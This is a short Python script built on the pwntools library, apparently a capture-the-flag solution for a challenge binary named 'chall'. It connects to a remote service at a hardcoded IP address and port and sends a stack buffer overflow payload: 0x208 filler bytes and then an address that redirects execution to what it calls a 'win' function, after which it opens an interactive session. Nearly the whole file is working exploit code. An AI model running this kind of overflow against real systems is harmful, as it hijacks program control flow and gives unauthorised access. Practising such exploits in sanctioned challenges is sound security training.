#!/usr/bin/env python3

from pwn import *

def conn():
    # r = process("./chall")
    # gdb.attach(r)

    r = remote("34.76.206.46", 10002)

    return r


def main():
    r = conn()

    buffer = "\x41"*0x208
    win_func = "\x46\x07\x40"
    payload = buffer + win_func

    r.recvuntil(b"Enter your name:")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
